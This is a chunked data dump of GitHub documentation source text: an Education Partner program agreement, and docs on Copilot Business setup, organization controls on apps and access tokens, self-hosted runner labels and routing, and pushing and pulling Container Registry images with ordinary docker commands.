GitHub is willing allow such use and access subject to compliance with this Agreement. GitHub and Education Partner are the \"Parties\", and each a \u201cParty.\u201d The Parties agree as follows:\n\n\n\n1. Definitions\n\nCapitalized terms herein shall have the meanings set forth below. Capitalized terms not otherwise defined in this Agreement will have the meanings ascribed to them in the applicable GitHub Product terms.\n\n\"_Campaign_\" means any activity engaged in by GitHub and Education Partner to promote the use of GitHub Products and Services or the Program through outreach campaigns, emails, print collateral, on a designated Education Partners website, and other marketing materials related to the Program. The Campaign may incorporate Partner Materials as set forth herein.\n\n\"_Designated Admin_\" means the Qualified User who is your designated account representative and administrator who will communicate with GitHub on your behalf. You may only have one Designated Admin.\n\n\"_Education Partner Program_\" or \"Program\u201d: means the GitHub program setting forth benefits and requirements for educational institutions and their Qualified Users (defined below).\n\n\"_GitHub Products_\" means the Service and the Software (as defined below)", "Y2h1bmtfMV9pbmRleF8yMDQ2": " which may be sold separately by GitHub as either \u201cGitHub Enterprise Cloud\u201d or \u201cGitHub Enterprise Server\u201d or together as \u201cGitHub Enterprise.\u201d\n\n\"_GitHub Program Manager_\" means GitHub\u2019s representative who will serve as your point of contact throughout the Term of the Program.\n\n\u201c_Partner Materials_\u201d means those materials you provide to help GitHub market and promote the Program to Qualified Users as part of the Campaign. Partner Materials include, but are not necessarily limited to, Education Partner\u2019s name, logo(s), masthead, graphic designs, trademarked materials, and all similar materials designed or intended to identify Education Partner.\n\n\"_Qualified Users_\" means any of the following individuals affiliated with Education Partner : (i) currently enrolled students; (ii) student-facing faculty; (iii) non-faculty staff employees; and (iv) anyone performing academic, not-for-profit research on behalf of or in collaboration with Education Partner .\n\n\"_Request Effective Date_\" means the date the Order Form is accepted and processed by the GitHub Program Manager.\n\n\"_Service_\" means the hosted GitHub Enterprise Cloud service. The Service includes: Organization account(s), SAML single sign-on, access provisioning, and any applicable Documentation. This list of features and services is non-exhaustive and may be updated from time to time.  Use of the Service is governed by the GitHub Customer Agreement.\n\n\"_Software_\" includes any applicable Documentation, as well as any Updates to the Software that GitHub provides to you or that you can access under the GitHub Customer Agreement as applicable.\n\n\"_Subscription License_\" means the license assigned to each Qualified User to install, operate, access, and use the GitHub Products. You may only assign one Subscription License per Qualified User across your GitHub Enterprise Server instances and GitHub Enterprise Cloud Organizations. Each Qualified User will have access to as many of your Enterprise Cloud Organizations as you permit. However, a single Subscription License may no", "Y2h1bmtfMl9pbmRleF8yMDQ2": "t be utilized by more than one Qualified User to access separate GitHub Products.\n\n\n\n2. Program Benefits and Conditions.\n\nProvided you remain in Good Standing (as defined in Section 2.3 below) and have not breached this Agreement, you will be entitled to receive the benefits described herein (collectively \u201cBenefits\u201d). GitHub may change available Benefits at any time in GitHub\u2019s sole discretion. Should GitHub elect to provide additional Benefits under the Program, GitHub may condition such Benefits on your agreeing to additional terms, restrictions and conditions (collectively \u201cAdditional Terms\u201d) applicable to such new or additional Benefits.\n\n\n\n2.1 Your Benefits.\n\nBenefits under the Program include the following:\n\n\n\n2.1.1 GitHub Product Benefits.\n\nAfter the Agreement Effective Date, Qualified Users shall have free access to Subscription Licenses on the Service or the Software for each Organization  listed on completed Order Forms submitted by the Designated Admin to the GitHub Program Manager. Access to and use of the Service and Software are subject to the terms of the GitHub Customer Agreement.\n\n\n\n2.1.2 Additional Qualified Users.\n\nYou may add Subscription Licenses, usage or Services for Qualified Users by completing and submitting a new Order Form no more frequently than quarterly. Quarterly requests may be submitted to the GitHub Program Manager using this form: https://support.github.com/contact/campus-program.\n\n\n\n2.1.3 Other Software Benefits.\n\nYou may also obtain additional GitHub Software Products through the Program. The GitHub Program Manager will distribute such Products, which will be subject to this Section 2 and any licenses and/or terms of use applicable to such Products.\n\n\n\n2.2 Conditions.\n\nYou must comply with all terms and conditions applicable to each GitHub Product made available through the Program. You must also comply with the following conditions:\n\n\n\n2.2.1 Distribution of GitHub Products.\n\nYou are responsible for informing all relevant departments at your institution of the available Progr", "Y2h1bmtfM19pbmRleF8yMDQ2": "am Benefits and availability of GitHub Products and for making GitHub Products available to any department interested in participating in the Program.\n\n\n\n2.2.2 Designated Admin.\n\nYou must appoint a Designated Admin prior to submitting your initial Order Form. This Designated Admin will be GitHub\u2019s single point of contact for your account and for any technical questions from Qualified Users about GitHub Products. The Designated Admin must provide their contact information to the GitHub Program Manager prior to submission of the Order Form. If the Designated Admin changes for any reason, you must immediately provide us with both notice and the new Designated Admin\u2019s contact information .\n\n\n\n2.2.3 Logo/Partner Material Usage.\n\nYou grant to GitHub the right to use your logo and other Partner Materials, subject to the terms of Section 5 (\u201cTrademark Release\u201d). All Partner Materials must be provided to GitHub for use in the Campaign no later than 30 days of the Agreement Effective Date.\n\n\n\n2.2.4 Qualified User Communications.\n\nYou must provide channels of communications and information to enable GitHub to communicate information about GitHub products and services to Qualified Users. These channels of communications may include email, SMS, social media or other means of communications designed to reach the maximum number of potential Qualified Users. To the extent required by applicable law, you represent and warrant that you have permission to provide such channels of communication and for GitHub to communication with such Qualified Users.  Every potential Qualified User contacted by GitHub will have the ability to opt-out of any future communications.\n\n\n\n2.3 Good Standing.\n\n\u201cGood Standing\u201d means that you are in current compliance with all Conditions in this Section 2 and with the Agreement (\u201cConditions\u201d). If you are not currently in compliance, GitHub may, but is not required to, allow you a period of time to cure your non-compliance and return to Good Standing. Granting a cure period is not a waiver of any term or con", "Y2h1bmtfNF9pbmRleF8yMDQ2": "dition of this Agreement nor a guarantee of any future cure period. You must remain in Good Standing throughout the Agreement Term and, upon request, report your compliance to GitHub. Failure to remain in Good Standing is a breach of this Agreement and may result in termination of the Agreement.\n\n\n\n3. Restrictions and Limitations.\n\n\n\n3.1 General Restrictions.\n\nYou agree: (i) not to resell the GitHub Products, or to charge any service or other fee to Qualified Users in connection with their use of the GitHub Products under this Agreement; (ii) that you are responsible and liable  for Qualified Users' use of the GitHub Products; and (iii) to cooperate with GitHub to enforce the terms of this Agreement in connection with Qualified Users' use of the GitHub Products, including, without limitation, sending appropriate notices to and terminating access to the GitHub Products for Qualified Users who misuse the GitHub Products in any way (iv) to support Qualified Users in the administration and maintenance of their accounts,; and (v) only your Designated Admin shall communicate with GitHub directly about program membership and administration of the Products and Services. You shall immediately terminate access to GitHub Products and Services for any Qualified User who no longer qualifies as such under this Agreement.\n\n\n\n3.2 GitHub Product Support.\n\nGitHub\u2019s obligation to provide technical or other support to Qualified Users is limited to that described in the GitHub Customer Agreement or as set forth in an Order Form. GitHub shall have no liability to you or any Qualified Users for loss or damages arising from or relating to use and access of the Services.\n\n\n\n4. Trademark Release.\n\n\n\n4.1 License.\n\nYou grant GitHub, during the Agreement Term, a worldwide, non-exclusive, royalty-free license to incorporate any of the Partner Materials (including any nonmaterial modifications thereto) into the Campaign and to publicly use, distribute, reproduce, and perform/display the Partner Materials and the Campaign, and any excerpts ther", "Y2h1bmtfNV9pbmRleF8yMDQ2": "eof, in any format or medium, in any language, and to attribute the Partner Materials to Education Partner. GitHub is not obligated to use the Partner Materials, however, any Partner Materials used by GitHub must be submitted by Education Partner and must be approved in advance by the GitHub Program Manager.\n\n\n\n4.2 Trademarks.\n\nEducation Partner grants to GitHub, during the Agreement Term, a worldwide, non-exclusive, royalty-free license to use Education Partner\u2019s name and trademarks (i) as they appear in the Partner Materials, if at all, and (ii) as otherwise approved by Education Partner in writing (\"Education Partner Trademarks\"), in the Campaign. All goodwill arising out of GitHub\u2019s use of the Education Partner Trademarks will inure to the benefit of Education Partner, and Education Partner will retain all right and title to the Education Partner Trademarks.\n\n\n\n4.3 No Compensation.\n\nThe licenses described herein from Education Partner to GitHub are granted without compensation or any financial or other obligation.\n\n\n\n4.4 Waiver; Reps and Warranties; Indemnification.\n\nThe Campaign shall be created and conducted by GitHub and Education Partner waives any right to approve the Campaign or to enjoin or impair GitHub\u2019s use of the Partner Materials in the Campaign. Education Partner represents and warrants that (i) it has all necessary rights to grant these licenses, (ii) the Partner Materials will not infringe any copyright, trade secret, trademark, or right of publicity/privacy, and (iii) any testimonials in the Partner Materials reflect Education Partner\u2019s honest opinions or experiences. Unless the Partner Materials are altered by GitHub without the consent or direction of Education Partner, Education Partner will indemnify and hold GitHub harmless from and against all third-party claims arising out of Education Partner\u2019s breach of these representations and warranties.\n\n\n\n5. Term and Termination.\n\n\n\n5.1 Term.\n\nThe term of this Agreement begins on the date the license key is delivered (for Software) or the subscri", "Y2h1bmtfNl9pbmRleF8yMDQ2": "ption is activated (for the Services) (\"Agreement Effective Date\"), and unless terminated in accordance with this Section, shall continue in effect for a period of one (1) year (the \u201cInitial Term\u201d). The Initial Term of this Agreement and each Renewal Term shall be referred to collectively as the \u201cAgreement Term.\u201d\n\n\n\n5.2 Termination for Convenience.\n\nEither Party may terminate this Agreement and any Order Forms submitted and accepted pursuant to the terms and conditions of this Agreement, at any time, for any reason or no reason, upon thirty (30) days\u2019 written notice. Termination of a portion of the Services offered herein or any Order Form will result in the termination of the entire Agreement.\n\n\n\n5.3 Termination for Breach.\n\nIf you breach this Agreement, we may terminate the Agreement or any Order Form thirty (30) days after we provide you with notice of the breach unless you cure the breach in that period. However, no such notice or cure period is required for any breach of any provision  relating to intellectual property (including compliance with the license or rights grant and any license or rights restrictions).\n\n\n\n5.4 Effect of Termination.\n\nUpon termination or expiration: (i) your license and any rights held by Qualified Users will immediately cease; and (ii) unless otherwise agreed in writing, you will, at your expense within five (5) days of the termination or expiration: (y) return or delete the Software along with any documentation in your possession or control; and (z) cease accessing and using the Services and send to GitHub a certification signed by one of your authorized employees confirming compliance with these requirements.. Sections 1 and 3 through 9 will survive the termination or expiration of this Agreement for any reason.\n\n\n\n5.5 Alternative Breach Resolution.\n\nIf you fail to maintain Good Standing or otherwise breach this Agreement, GitHub may elect not to declare a breach or otherwise terminate this agreement but, instead, continue to provide the GitHub Products for the remainder of the A", "Y2h1bmtfN19pbmRleF8yMDQ2": "greement Term at the price of the GitHub Products then posted on GitHub\u2019s public Website at the time of the breach. You agree to pay all fees associated with GitHub so providing the Products as set forth in this Section.\n\n\n\n6. No Warranty; Disclaimer.\n\nThe GitHub Products are being provided \"AS IS\", and without warranty of any kind, express or implied. GITHUB DISCLAIMS ALL WARRANTIES WITH RESPECT TO THE GITHUB PRODUCTS, EXPRESS OR IMPLIED, INCLUDING THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NON-INFRINGEMENT, AND ANY WARRANTIES ARISING OUT OF COURSE OF DEALING OR USAGE OF TRADE.\n\n\n\n7. Limitation of Liability.\n\n\n\n7.1 Waiver of Consequential Damages.\n\nIN NO EVENT WILL EITHER PARTY BE LIABLE TO THE OTHER OR TO ANY THIRD PARTY FOR ANY INDIRECT, SPECIAL, INCIDENTAL, CONSEQUENTIAL, EXEMPLARY OR PUNITIVE DAMAGES, INCLUDING BUT NOT LIMITED TO DAMAGES FOR LOST DATA, LOST PROFITS OR COSTS OF PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES, HOWEVER CAUSED AND UNDER ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, TORT (INCLUDING WITHOUT LIMITATION PRODUCTS LIABILITY, STRICT LIABILITY AND NEGLIGENCE), OR ANY OTHER THEORY, AND WHETHER OR NOT SUCH PARTY KNEW OR SHOULD HAVE KNOWN ABOUT THE POSSIBILITY OF SUCH DAMAGE.\n\n\n\n7.2 Limitation of Total Liability.\n\nIN NO EVENT WILL EITHER PARTY\u2019S AGGREGATE LIABILITY ARISING OUT OF OR RELATED TO THIS AGREEMENT FOR ANY CAUSE WHATSOEVER, AND REGARDLESS OF THE FORM OF ACTION, EXCEED THE GREATER OF (I) AMOUNTS ONE PARTY HAS ACTUALLY PAID THE OTHER PARTY UNDER THIS AGREEMENT; OR (II) FIVE HUNDRED DOLLARS ($500). THE FOREGOING LIMITATIONS WILL APPLY NOTWITHSTANDING THE FAILURE OF ESSENTIAL PURPOSE OF ANY LIMITED REMEDY STATED IN THIS AGREEMENT.\n\n\n\n8. Miscellaneous.\n\n\n\n8.1 No Assignment.\n\nYou are not allowed to assign or transfer any of your rights or obligations in this Agreement, in whole or in part, by operation of law or otherwise, without our prior written consent, and any attempt by you to do so will be null and void. We can assign this Agreement in  its enti", "Y2h1bmtfOF9pbmRleF8yMDQ2": "rety, upon notice to you, in connection with a merger, acquisition, corporate reorganization, or sale of all or substantially all of our business or assets.\n\n\n\n8.2 Severability.\n\nIf any provision of this Agreement is deemed by a court of competent jurisdiction to be illegal, invalid, or unenforceable, the court will modify or reform this Agreement to give as much effect as possible to that provision. Any provision that can\u2019t be modified or reformed in this way will be deemed deleted, and the remaining provisions of this Agreement will continue in full force and effect.\n\n\n\n8.3 No Waiver.\n\nThe failure of GitHub to exercise or enforce any right or provision of this Agreement shall not constitute a waiver of such right or provision.\n\n\n\n8.4 Force Majeure.\n\nThe Parties will be excused from performing under this Agreement to the extent they are unable to perform due to extraordinary causes beyond our reasonable control such as acts of God, strikes, lockouts, riots, acts of war, epidemics, communication line failure, and power failures.\n\n\n\n8.5 Independent Contractors.\n\nThe Parties are independent contractors and nothing contained in this Agreement (regardless if a party is described as a \u201cPartner\u201d) will be deemed or construed in any manner whatsoever to create a joint venture, partnership, employment, agency, fiduciary, or other similar relationship between us. Neither Party may bind the other to any obligation, whether contractual or otherwise.\n\n\n\n8.6 Governing Law.\n\nThis Agreement and your use of the GitHub Products are governed under California law and any dispute related to the GitHub Products or the subject matter of these terms must be brought in a tribunal of competent jurisdiction located in or near San Francisco, California.\n\n\n\n8.7 Changes to the Agreement; Complete Agreement.\n\nGitHub may amend this Agreement at any time. Should GitHub materially amends this Agreement,  it will notify you of such changes at least 30 days prior to the change taking effect by posting a notice on our Website. This Agreement, togeth", "Y2h1bmtfOV9pbmRleF8yMDQ2": "er with any applicable GitHub Products terms and GitHub's Privacy Statement, and Order Forms represent the complete and exclusive statement of the agreement between you and us and governs your use of the GitHub Products. This Agreement supersedes any proposal or prior agreement oral or written, and any other communications between you and GitHub relating to the subject matter of these terms (including, but not limited to, any prior versions of this Agreement).\n\n", "Y2h1bmtfMF9pbmRleF8xMTM0": "\n\nEnabling {% data variables.product.prodname_copilot_business_short %} for your enterprise\n\n{% note %}\n\n**Note:**\n\n- You must be an enterprise owner to enable {% data variables.product.prodname_copilot_business_short %} for your enterprise.\n- If you set up a {% data variables.product.prodname_copilot_business_short %} subscription for your organization account, you can skip this section.\n\n{% endnote %}\n\nYour enterprise owner can enable {% data variables.product.prodname_copilot_business_short %} for the organizations in the enterprise by first establishing the policy and then assigning users. To enforce a policy to manage the use of {% data variables.product.prodname_copilot_business_short %}, follow the steps in \"AUTOTITLE.\" If you need additional help with policy configuration or user assignment for {% data variables.product.prodname_copilot_business_short %}, you can contact {% data variables.contact.contact_enterprise_sales %}.\n\n{% data variables.product.prodname_copilot %} includes a filter which detects code suggestions that match public code on {% data variables.product.prodname_dotcom %}. Your enterprise owner can choose whether to enable or disable the filter at the enterprise-level, or allow organization owners to decide at the organization-level. For more information, see \"AUTOTITLE.\"{% endif %}\n\n\n\nConfiguring {% data variables.product.prodname_copilot %} settings in your organization\n\n{% ifversion ghec %}\n{% note %}\n\n**Note:** If you set up a {% data variables.product.prodname_copilot_business_short %} subscription for your organization account, you configure {% data variables.product.prodname_copilot %} settings in your organization without an enterprise policy.\n\n{% endnote %}\n\nOnce an enterprise owner has enabled {% data variables.product.prodname_copilot_business_short %} for an organization, organization owners and members with admin permissions can configure {% data variables.product.prodname_copilot %} access for their organization. Depending on the policy settings configured at the enterprise-", "Y2h1bmtfMV9pbmRleF8xMTM0": "level, an organization owner may also be able to determine whether to allow or block {% data variables.product.prodname_copilot %} suggestions that match public code.{% endif %}{% ifversion fpt %}After setting up a {% data variables.product.prodname_copilot_business_short %} subscription for your organization, you can configure {% data variables.product.prodname_copilot %} settings in your organization. This includes granting and revoking access to individuals and teams, and determining whether to block suggestions that match public code.{% endif %} For more information, see \"AUTOTITLE.\"\n\n\n\nAssigning {% data variables.product.prodname_copilot %} seats\n\nTo give people or teams within your organization access to {% data variables.product.prodname_copilot %}, you need to assign them a {% data variables.product.prodname_copilot %} seat. {% ifversion ghec %}Once a {% data variables.product.prodname_ghe_cloud %} admin enables a {% data variables.product.prodname_copilot_business_short %} subscription in your organization, you can assign {% data variables.product.prodname_copilot %} seats to individuals and teams in your organization.{% endif %} To enable access for all current and future users in your organization, or specific users in your organization, follow the steps in \"AUTOTITLE.\"\n\n\n\nConfiguring network settings\n\nIf members of your organization will be using {% data variables.product.prodname_copilot %} on your company's corporate network, you may need to configure network settings so that members can use {% data variables.product.prodname_copilot %} successfully.\n\n- If you use an HTTP proxy server on your network, you can configure {% data variables.product.prodname_copilot %} to connect via this server. To  successfully intercept and inspect {% data variables.product.prodname_copilot %}'s secure connection, you may need to install custom SSL certificates on your users' machines. For more information, see \"AUTOTITLE.\"\n- If you use a firewall, you may need to add certain domains to the firewall's allowlist. For m", "Y2h1bmtfMl9pbmRleF8xMTM0": "ore information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xNTY3": "\n\nAbout programmatic access\n\n{% data variables.product.prodname_github_apps %}, {% data variables.product.prodname_oauth_apps %}, and {% data variables.product.pat_generic %}s can be used to make API requests that read or write resources owned by an organization. As an organization owner, you can control access to your organization by {% data variables.product.prodname_github_apps %}{% ifversion fpt or ghec %}, {% data variables.product.prodname_oauth_apps %},{% endif %} and {% data variables.product.pat_generic %}s.\n\n\n\n{% data variables.product.prodname_github_apps %}\n\nOrganization owners can install {% data variables.product.prodname_github_apps %} on their organization. Repository admins can also install a {% data variables.product.prodname_github_app %} on the organization if the app does not request organization resources and if they only grant the app access to repositories where they are an admin. Organization members can submit a request for their organization owner to install a {% data variables.product.prodname_github_app %} on the organization. For more information, see {% ifversion fpt or ghec%}\"AUTOTITLE.\"{% else %}\"AUTOTITLE.\"{% endif %}\n\n{% ifversion limit-app-access-requests %}Organization owners can prevent outside collaborators from requesting {% data variables.product.prodname_github_apps %} or from installing a {% data variables.product.prodname_github_app %} even if the collaborator is a repository admin. For more information, see \"AUTOTITLE.\"{% endif %}\n\nOrganization owners can review the {% data variables.product.prodname_github_apps %} that are installed on their organization and modify the repositories that each app can access. For more information, see \"AUTOTITLE.\"\n\nTo help maintain {% data variables.product.prodname_github_apps %} owned by their organization, organization owners can designate other users in their organization as {% data variables.product.prodname_github_app %} managers. {% data variables.product.prodname_github_app %} managers can manage the settings of some or all of t", "Y2h1bmtfMV9pbmRleF8xNTY3": "he {% data variables.product.prodname_github_apps %} that are owned by the organization. The {% data variables.product.prodname_github_app %} manager role does not grant users permission to install {% data variables.product.prodname_github_apps %} on an organization. For more information, see \"AUTOTITLE.\"\n\n{% ifversion fpt or ghec %}\n\n\n\n{% data variables.product.prodname_oauth_apps %}\n\nOrganization managers can restrict {% data variables.product.prodname_oauth_apps %} from accessing organization resources. When these restrictions are enabled, organization members and outside collaborators can still request approval for individual {% data variables.product.prodname_oauth_apps %}. For more information, see \"AUTOTITLE.\"\n\n{% endif %}\n\n\n\n{% data variables.product.pat_generic_caps %}s\n\n{% ifversion pat-v2%}\n\nOrganization owners can prevent {% data variables.product.pat_v2 %}s and {% data variables.product.pat_v1_plural %} from accessing resources owned by the organization. Organization owners can also require approval for each {% data variables.product.pat_v2 %} that can access the organization. For more information, see \"AUTOTITLE.\"\n\nOrganization owners can view all {% data variables.product.pat_v2 %}s that can access resources owned by the organization. Organization owners can also revoke access by {% data variables.product.pat_v2 %}s. For more information, see \"AUTOTITLE.\"\n\n{% endif %}\n\n{% ifversion ghec %}\n\nIf their organization uses SAML, organization owners can see each {% data variables.product.pat_generic %} that a member of their organization authorized. For more information, see \"AUTOTITLE.\"\n\n{% endif %}\n\n{% ifversion ghes or ghae %}\n\nSite administrators can use the REST API to manage {% data variables.product.pat_generic %}s in their enterprise. For more information, see \"AUTOTITLE\" in the REST API documentation.\n\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xMjM=": "\n\nAbout self-hosted runner labels\n\nLabels allow you to send workflow jobs to specific types of self-hosted runners, based on their shared characteristics. For example, if your job requires a particular hardware component or software package, you can assign a custom label to a runner and then configure your job to only execute on runners with that label.\n\n{% data reusables.actions.self-hosted-runner-labels-runs-on %}\n\nFor information on creating custom and default labels, see \"AUTOTITLE.\"\n\n{% ifversion target-runner-groups %}\n\n\n\nAbout self-hosted runner groups\n\nFor self-hosted runners defined at the organization {% ifversion ghec or ghes or ghae %}or enterprise levels{% else %}level{% endif %}, you can group your runners with shared characteristics into a single runner group and then configure your job to target the runner group.\n\nTo specify a self-hosted runner group for your job, configure `runs-on.group` in your workflow file.\n\nFor information on creating and managing runner groups, see \"AUTOTITLE.\"\n\n{% endif %}\n\n{% ifversion repository-actions-runners %}\n\n\n\nViewing available runners for a repository\n\n{% note %}\n\n**Note:** This feature is currently in beta and subject to change.\n\n{% endnote %}\n\n{% data reusables.actions.about-viewing-runner-list %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.repository-runners %}\n1. Click the **Self hosted** tab at the top of the list of runners.\n1. Review the list of available self-hosted runners for the repository. This list includes both self-hosted runners and runner scale sets created with {% data variables.product.prodname_actions_runner_controller %}. For more information, see \"AUTOTITLE.\"\n{% data reusables.actions.copy-runner-label %}\n\n{% data reusables.actions.actions-tab-new-runners-note %}\n\n{% endif %}\n\n\n\nUsing default labels to route jobs\n\nA self-hosted runner automatically receives certain labels when it is added to {% data variables.product.prodname_actions %}. These are used to i", "Y2h1bmtfMV9pbmRleF8xMjM=": "ndicate its operating system and hardware platform:\n\n- `self-hosted`: Default label applied to all self-hosted runners.\n- `linux`, `windows`, or `macOS`: Applied depending on operating system.\n- `x64`, `ARM`, or `ARM64`: Applied depending on hardware architecture.\n\nYou can use your workflow's YAML to send jobs to a combination of these labels. In this example, a self-hosted runner that matches all three labels will be eligible to run the job:\n\n```yaml\nruns-on: [self-hosted, linux, ARM64]\n```\n\n- `self-hosted` - Run this job on a self-hosted runner.\n- `linux` - Only use a Linux-based runner.\n- `ARM64` - Only use a runner based on ARM64 hardware.\n\nThe default labels are fixed and cannot be changed or removed. Consider using custom labels if you need more control over job routing.\n\n\n\nUsing custom labels to route jobs\n\nYou can create custom labels and assign them to your self-hosted runners at any time. Custom labels let you send jobs to particular types of self-hosted runners, based on how they're labeled.\n\nFor example, if you have a job that requires a specific type of graphics hardware, you can create a custom label called `gpu` and assign it to the runners that have the hardware installed. A self-hosted runner that matches all the assigned labels will then be eligible to run the job.\n\nThis example shows a job that combines default and custom labels:\n\n```yaml\nruns-on: [self-hosted, linux, x64, gpu]\n```\n\n- `self-hosted` - Run this job on a self-hosted runner.\n- `linux` - Only use a Linux-based runner.\n- `x64` - Only use a runner based on x64 hardware.\n- `gpu` - This custom label has been manually assigned to self-hosted runners with the GPU hardware installed.\n\nThese labels operate cumulatively, so a self-hosted runner must have all four labels to be eligible to process the job.\n\n{% ifversion target-runner-groups %}\n\n\n\nUsing groups to route jobs\n\n{% data reusables.actions.jobs.example-runs-on-groups %}\n\n\n\nUsing labels and groups to route jobs\n\n{% data reusables.actions.jobs.example-runs-on-labels-and-groups %}\n\n{% e", "Y2h1bmtfMl9pbmRleF8xMjM=": "ndif %}\n\n\n\nRouting precedence for self-hosted runners\n\nWhen routing a job to a self-hosted runner, {% data variables.product.prodname_dotcom %} looks for a runner that matches the job's `runs-on` labels{% ifversion target-runner-groups %} and/or groups{% endif %}:\n\n- If {% data variables.product.prodname_dotcom %} finds an online and idle runner that matches the job's `runs-on` labels{% ifversion target-runner-groups %} and/or groups{% endif %}, the job is then assigned and sent to the runner.\n  - If the runner doesn't pick up the assigned job within 60 seconds, the job is re-queued so that a new runner can accept it.\n- If {% data variables.product.prodname_dotcom %} doesn't find an online and idle runner that matches the job's `runs-on` labels {% ifversion target-runner-groups %} and/or groups{% endif %}, then the job will remain queued until a runner comes online.\n- If the job remains queued for more than 24 hours, the job will fail.\n\n", "Y2h1bmtfMF9pbmRleF8xNjMz": "\n\nAbout the {% data variables.product.prodname_container_registry %}\n\n{% data reusables.package_registry.container-registry-benefits %}\n\n{% ifversion ghes %}\n\nTo use the {% data variables.product.prodname_container_registry %} on {% data variables.product.product_name %}, your site administrator must first configure {% data variables.product.prodname_registry %} for your instance **and** enable subdomain isolation. For more information, see \"AUTOTITLE\" and \"AUTOTITLE.\"\n\n{% endif %}\n\n\n\nAbout {% data variables.product.prodname_container_registry %} support\n\nThe {% data variables.product.prodname_container_registry %} currently supports the following container image formats:\n\n- Docker Image Manifest V2, Schema 2\n- Open Container Initiative (OCI) Specifications\n\nWhen installing or publishing a Docker image, the {% data variables.product.prodname_container_registry %} supports foreign layers, such as Windows images.\n\n\n\nAuthenticating to the {% data variables.product.prodname_container_registry %}\n\n{% data reusables.package_registry.authenticate-packages %}\n\n{% ifversion packages-registries-v2 %}\n\n\n\nAuthenticating in a {% data variables.product.prodname_actions %} workflow\n\nThis registry supports granular permissions. {% data reusables.package_registry.authenticate_with_pat_for_v2_registry %}\n\n{% data reusables.package_registry.v2-actions-codespaces %}\n{% endif %}\n\n\n\nAuthenticating with a {% data variables.product.pat_v1 %}\n\n{% ifversion ghes %}Ensure that you replace `HOSTNAME` with {% data variables.location.product_location_enterprise %} hostname or IP address in the examples below.{% endif %}\n\n{% data reusables.package_registry.authenticate-to-container-registry-steps %}\n\n\n\nPushing container images\n\nThis example pushes the latest version of `IMAGE_NAME`.\n\n```shell\ndocker push {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME:latest\n```\n\nReplace `NAMESPACE` with the name of the personal account or organization to which you want the image to be scoped.\n\nThis example pushes the `2.", "Y2h1bmtfMV9pbmRleF8xNjMz": "5` version of the image.\n\n```shell\ndocker push {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME:2.5\n```\n\n{% data reusables.package_registry.publishing-user-scoped-packages %} You can link a published package to a repository using the user interface or command line. For more information, see \"AUTOTITLE.\"\n\nWhen you push a container image from the command line, the image is not linked to a repository by default. This is the case even if you tag the image with a namespace that matches the name of the repository, such as `{% ifversion fpt or ghec %}ghcr.io{% elsif ghes %}{% data reusables.package_registry.container-registry-example-hostname %}{% endif %}/octocat/my-repo:latest`.\n\nThe easiest way to connect a repository to a container package is to publish the package from a workflow using `${% raw %}{{secrets.GITHUB_TOKEN}}{% endraw %}`, as the repository that contains the workflow is linked automatically. Note that the `GITHUB_TOKEN` will not have permission to push the package if you have previously pushed a package to the same namespace, but have not connected the package to the repository.\n\nTo connect a repository when publishing an image from the command line, and to ensure your `GITHUB_TOKEN` has appropriate permissions when using a GitHub Actions workflow, we recommend adding the label `org.opencontainers.image.source` to your `Dockerfile`. For more information, see \u201cLabelling container images\u201d in this article and \u201cAUTOTITLE.\u201d\n\n\n\nPulling container images\n\n\n\nPull by digest\n\nTo ensure you're always using the same image, you can specify the exact container image version you want to pull by the `digest` SHA value.\n\n1. To find the digest SHA value, use `docker inspect` or `docker pull` and copy the SHA value after `Digest:`\n\n   ```shell\n   docker inspect {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME\n   ```\n\n   Replace `NAMESPACE` with the name of the personal account or organization to which the image is scoped.\n1. Remove image locally as", "Y2h1bmtfMl9pbmRleF8xNjMz": " needed.\n\n   ```shell\n   docker rmi  {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME:latest\n   ```\n\n1. Pull the container image with `@YOUR_SHA_VALUE` after the image name.\n\n   ```shell\n   docker pull {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME@sha256:82jf9a84u29hiasldj289498uhois8498hjs29hkuhs\n   ```\n\n\n\nPull by name\n\n```shell\ndocker pull {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME\n```\n\nReplace `NAMESPACE` with the name of the personal account or organization to which the image is scoped.\n\n\n\nPull by name and version\n\nDocker CLI example showing an image pulled by its name and the `1.14.1` version tag:\n\n```shell\n$ docker pull {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME:1.14.1\n> 5e35bd43cf78: Pull complete\n> 0c48c2209aab: Pull complete\n> fd45dd1aad5a: Pull complete\n> db6eb50c2d36: Pull complete\n> Digest: sha256:ae3b135f133155b3824d8b1f62959ff8a72e9cf9e884d88db7895d8544010d8e\n> Status: Downloaded newer image for {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME/release:1.14.1\n> {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME/release:1.14.1\n```\n\nReplace `NAMESPACE` with the name of the personal account or organization to which the image is scoped.\n\n\n\nPull by name and latest version\n\n```shell\n$ docker pull {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME:latest\n> latest: Pulling from NAMESPACE/IMAGE_NAME\n> Digest: sha256:b3d3e366b55f9a54599220198b3db5da8f53592acbbb7dc7e4e9878762fc5344\n> Status: Downloaded newer image for {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME:latest\n> {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME:latest\n```\n\nReplace `NAMESPACE` with the name of the personal account or organization to which the image is scoped.\n\n\n\nBuilding container images", "Y2h1bmtfM19pbmRleF8xNjMz": "\n\nThis example builds the `hello_docker` image:\n\n```shell\ndocker build -t hello_docker .\n```\n\n\n\nTagging container images\n\n1. Find the ID for the Docker image you want to tag.\n\n   ```shell\n   $ docker images\n   > REPOSITORY                                            TAG                 IMAGE ID            CREATED             SIZE\n   > {% data reusables.package_registry.container-registry-hostname %}/my-org/hello_docker         latest            38f737a91f39        47 